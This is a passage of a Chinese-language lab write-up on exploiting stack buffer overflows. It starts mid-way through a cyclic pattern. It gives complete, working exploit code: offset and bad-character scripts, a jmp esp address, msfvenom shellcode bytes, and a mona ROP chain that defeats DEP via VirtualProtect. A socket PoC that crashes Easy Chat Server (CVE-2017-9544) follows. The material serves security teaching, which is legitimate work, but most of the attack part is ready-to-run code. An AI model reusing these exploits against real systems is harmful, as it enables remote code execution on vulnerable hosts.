k8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk</span><br></pre></td></tr></tbody></table></figure>
<p>赋值给 buffer，运行查看此时 EIP 的值</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241220004926924.png" alt="image-20241220004926924"></p>
<p>可以看到 <code>EIP=38f4337</code></p>
<p>再用 mona 工具来定位这个值的位置</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241220010255404.png" alt="image-20241220010255404"></p>
<p>可以看到 offset=2003</p>
<p>修改 poc 如下验证偏移是否正确</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="string">b"A"</span>*<span class="number">2003</span> + <span class="string">b"BBBB"</span> + <span class="string">b"C"</span>*(<span class="number">5000</span>-<span class="number">2003</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>运行，程序崩溃</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241220010617772.png" alt="image-20241220010617772"></p>
<p>可以看到此时 <code>EIP=42424242</code> BBBB 字符精准溢出，说明偏移是正确的</p>
<h3 id="坏字节分析-4"><a class="markdownIt-Anchor" href="#坏字节分析-4">#</a> 坏字节分析</h3>
<p>生成坏字节字符串</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona ba -b "\x00"</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">badchar =  <span class="string">b""</span></span><br><span class="line">badchar += <span class="string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span></span><br><span class="line">badchar += <span class="string">b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line">badchar += <span class="string">b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span></span><br><span class="line">badchar += <span class="string">b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span></span><br><span class="line">badchar += <span class="string">b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span></span><br><span class="line">badchar += <span class="string">b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span></span><br><span class="line">badchar += <span class="string">b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span></span><br><span class="line">badchar += <span class="string">b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br></pre></td></tr></tbody></table></figure>
<p>修改 poc 如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="string">b"A"</span>*<span class="number">2003</span> + <span class="string">b"BBBB"</span> + badchar + <span class="string">b"C"</span>*(<span class="number">5000</span>-<span class="number">2003</span>-<span class="number">4</span>-<span class="built_in">len</span>(badchar))</span><br></pre></td></tr></tbody></table></figure>
<p>运行，程序崩溃，查看此时栈中情况</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241220011458242.png" alt="image-20241220011458242"></p>
<p>发现坏字符只有 <code>\x00</code>  字符</p>
<h3 id="寻找跳转指令-2"><a class="markdownIt-Anchor" href="#寻找跳转指令-2">#</a> 寻找跳转指令</h3>
<p>寻找可用的跳转指令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241220011723889.png" alt="image-20241220011723889"></p>
<p>选择可用 jmp 指令第一个地址 <code>625011af</code></p>
<p>修改 poc 如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="string">b"A"</span>*<span class="number">2003</span> + <span class="string">b"\xaf\x11\x50\x62"</span> + <span class="string">b"C"</span>*(<span class="number">5000</span>-<span class="number">2003</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>在 <code>625011af</code>  处下断点，然后重新运行，发现程序果然断在 <code>625011af</code> ，跳转指令也验证成功</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241220012528275.png" alt="image-20241220012528275"></p>
<h3 id="编写shellcode-6"><a class="markdownIt-Anchor" href="#编写shellcode-6">#</a> 编写 shellcode</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD="calc.exe" -b "\x00" -f python -v shellcode</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shellcode =  <span class="string">b""</span></span><br><span class="line">shellcode += <span class="string">b"\xbf\xa0\x1b\xd3\x98\xda\xc7\xd9\x74\x24\xf4"</span></span><br><span class="line">shellcode += <span class="string">b"\x5a\x29\xc9\xb1\x31\x31\x7a\x13\x03\x7a\x13"</span></span><br><span class="line">shellcode += <span class="string">b"\x83\xea\x5c\xf9\x26\x64\x74\x7c\xc8\x95\x84"</span></span><br><span class="line">shellcode += <span class="string">b"\xe1\x40\x70\xb5\x21\x36\xf0\xe5\x91\x3c\x54"</span></span><br><span class="line">shellcode += <span class="string">b"\x09\x59\x10\x4d\x9a\x2f\xbd\x62\x2b\x85\x9b"</span></span><br><span class="line">shellcode += <span class="string">b"\x4d\xac\xb6\xd8\xcc\x2e\xc5\x0c\x2f\x0f\x06"</span></span><br><span class="line">shellcode += <span class="string">b"\x41\x2e\x48\x7b\xa8\x62\x01\xf7\x1f\x93\x26"</span></span><br><span class="line">shellcode += <span class="string">b"\x4d\x9c\x18\x74\x43\xa4\xfd\xcc\x62\x85\x53"</span></span><br><span class="line">shellcode += <span class="string">b"\x47\x3d\x05\x55\x84\x35\x0c\x4d\xc9\x70\xc6"</span></span><br><span class="line">shellcode += <span class="string">b"\xe6\x39\x0e\xd9\x2e\x70\xef\x76\x0f\xbd\x02"</span></span><br><span class="line">shellcode += <span class="string">b"\x86\x57\x79\xfd\xfd\xa1\x7a\x80\x05\x76\x01"</span></span><br><span class="line">shellcode += <span class="string">b"\x5e\x83\x6d\xa1\x15\x33\x4a\x50\xf9\xa2\x19"</span></span><br><span class="line">shellcode += <span class="string">b"\x5e\xb6\xa1\x46\x42\x49\x65\xfd\x7e\xc2\x88"</span></span><br><span class="line">shellcode += <span class="string">b"\xd2\xf7\x90\xae\xf6\x5c\x42\xce\xaf\x38\x25"</span></span><br><span class="line">shellcode += <span class="string">b"\xef\xb0\xe3\x9a\x55\xba\x09\xce\xe7\xe1\x47"</span></span><br><span class="line">shellcode += <span class="string">b"\x11\x75\x9c\x25\x11\x85\x9f\x19\x7a\xb4\x14"</span></span><br><span class="line">shellcode += <span class="string">b"\xf6\xfd\x49\xff\xb3\xf2\x03\xa2\x95\x9a\xcd"</span></span><br><span class="line">shellcode += <span class="string">b"\x36\xa4\xc6\xed\xec\xea\xfe\x6d\x05\x92\x04"</span></span><br><span class="line">shellcode += <span class="string">b"\x6d\x6c\x97\x41\x29\x9c\xe5\xda\xdc\xa2\x5a"</span></span><br><span class="line">shellcode += <span class="string">b"\xda\xf4\xc0\x3d\x48\x94\x28\xd8\xe8\x3f\x35"</span></span><br></pre></td></tr></tbody></table></figure>
<p>再修改 poc</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="string">b"A"</span>*<span class="number">2003</span> + <span class="string">b"\xaf\x11\x50\x62"</span> + <span class="string">b"\x90"</span>*<span class="number">16</span> + shellcode + <span class="string">b"C"</span>*(<span class="number">5000</span>-<span class="number">2003</span>-<span class="number">4</span>-<span class="built_in">len</span>(shellcode))</span><br></pre></td></tr></tbody></table></figure>
<p>运行 poc 发现成功弹出计算机</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241220012943682.png" alt="image-20241220012943682"></p>
<h3 id="在win7系统启动dep"><a class="markdownIt-Anchor" href="#在win7系统启动dep">#</a> 在 win7 系统启动 DEP</h3>
<p>如遇到 <code>immunitydbg</code>  使用 mona 工具无法生成对应文件时检查是否以管理员身份运行</p>
<h4 id="启用dep"><a class="markdownIt-Anchor" href="#启用dep">#</a> 启用 DEP</h4>
<p>控制面板 - 系统 - 高级系统设置 - 高级 - 性能 - 配置 - 数据执行保护</p>
<p>可以发现开启 ** 数据执行保护（DEP）** 之后，再运行 poc 虽然程序崩溃，但是没有弹出计算机，说明是没有成功执行 <code>sellcode</code>  的</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241221005347480.png" alt="image-20241221005347480"></p>
<p>那么此时需要<strong> rop</strong> 来绕过 <strong>数据执行保护（DEP）</strong></p>
<h4 id="生成rop"><a class="markdownIt-Anchor" href="#生成rop">#</a> 生成 ROP</h4>
<p><code>!mona rop</code>  指令会生成文件 <code>ropchain.txt</code> ，但是里面 python 第一条是 #00000000，因此不 行，使用下面指令，去掉为 00000000 的指令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona rop -m *.dll -n -cpb "\x00" </span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241221010710974.png" alt="image-20241221010710974"></p>
<p><code>rop_chains.txt</code>  文件里面找到对应的 python 脚本</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import struct</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x7657eec4</span>,  <span class="comment"># POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x6250609c</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span></span><br><span class="line">      <span class="number">0x74ddfd52</span>,  <span class="comment"># MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x7652a027</span>,  <span class="comment"># POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x625011bb</span>,  <span class="comment"># &amp; jmp esp [essfunc.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x75f3ead5</span>,  <span class="comment"># POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x76262f3a</span>,  <span class="comment"># NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x74ddf9f1</span>,  <span class="comment"># XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x75c35fb8</span>,  <span class="comment"># POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x74dc2fd0</span>,  <span class="comment"># NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x75eb0815</span>,  <span class="comment"># XCHG EAX,EDX # RETN [kernel32.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x76574590</span>,  <span class="comment"># POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x62504207</span>,  <span class="comment"># &amp;Writable location [essfunc.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x76550a21</span>,  <span class="comment"># POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x762637c8</span>,  <span class="comment"># RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x75f50c36</span>,  <span class="comment"># POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x75c36885</span>,  <span class="comment"># PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b''</span>.join(struct.pack(<span class="string">'&lt;I'</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line">    </span><br><span class="line">rop_chain = create_rop_chain()</span><br></pre></td></tr></tbody></table></figure>
<p>再修改 poc 如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">b"\x41"</span>*<span class="number">2003</span> + rop_chain + <span class="string">b"\x90"</span>*<span class="number">16</span> + shellcode + <span class="string">b"\x43"</span>*(<span class="number">5000</span>-<span class="number">2003</span>-<span class="built_in">len</span>(rop_chain)-<span class="number">16</span>- <span class="built_in">len</span>(shellcode))</span><br></pre></td></tr></tbody></table></figure>
<p>发现成功绕过了 dep 保护，执行了 shellcode 弹出计算机</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241221011341127.png" alt="image-20241221011341127"></p>
<h2 id="针对web服务类型的实例-cve-2017-9544"><a class="markdownIt-Anchor" href="#针对web服务类型的实例-cve-2017-9544">#</a> 针对 Web 服务类型的实例 - CVE-2017-9544</h2>
<h3 id="触发漏洞-5"><a class="markdownIt-Anchor" href="#触发漏洞-5">#</a> 触发漏洞</h3>
<p>在靶机上运行 <code>easy chat server</code>  开启服务器，（我这里用的是主机）访问服务器地址，输入用户名密码然后点击 <code>register</code> ，bp 抓到这个包分析</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222003351484.png" alt="image-20241222003351484"></p>
<p>（再<strong> ctrl+I</strong> 或者右键选择）发送给 Intruder 攻击器</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222003046784.png" alt="image-20241222003046784"></p>
<p>选择载荷为字符块（ <code>character block</code> ），长度这里选择 100-400（因为 300 个就会触发异常）间隔 step=100</p>
<p>开始攻击</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222004122732.png" alt="image-20241222004122732"></p>
<p>发现 username=200 个 A 时候正常，但是 300 个 A 的时候没有响应包了，这时候回到服务器发现已经崩溃</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222004058737.png" alt="image-20241222004058737"></p>
<p>查看此时 <code>EIP=41414141</code>  发现已经被 username 覆盖了</p>
<p>编写如下脚本</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.177.135'</span>  <span class="comment"># easy chat server IP </span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">connect = s.connect((ip, <span class="number">80</span>)) </span><br><span class="line"></span><br><span class="line">junk = <span class="string">"A"</span> * <span class="number">300</span> </span><br><span class="line">buffer = <span class="string">"POST /registresult.htm HTTP/1.1\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Host: 10.10.10.135\r\n"</span> </span><br><span class="line">buffer += <span class="string">"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Accept-Language: en-us,en;q=0.5\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Accept-Encoding: gzip, deflate\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Keep-Alive: 115\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Referer: http://10.10.10.135/register.ghp\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Content-Type: application/x-www-form-urlencoded\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Content-Length: 473\r\n"</span> </span><br><span class="line">buffer += <span class="string">"Connection: close\r\n"</span> </span><br><span class="line">buffer += <span class="string">"UserName="</span> + junk + <span class="string">"&amp;Password=FFFF&amp;Password1=FFFF&amp;Sex=2&amp;Email=fff%40ffff.com&amp;Icon=0.gif&amp;Resume= &amp;cw=1&amp;RoomID=%3C%21--%24RoomID--%3E&amp;RepUserName=%3C%21--%24UserName-%3E&amp;submit1=Register"</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求时，将字符串编码为字节类型</span></span><br><span class="line">s.send(buffer.encode()) </span><br><span class="line">data = s.recv(<span class="number">4096</span>) </span><br><span class="line"><span class="built_in">print</span>(data) </span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>构造 socket 连接来触发漏洞</p>
<p>运行 poc 脚本，成功触发漏洞</p>
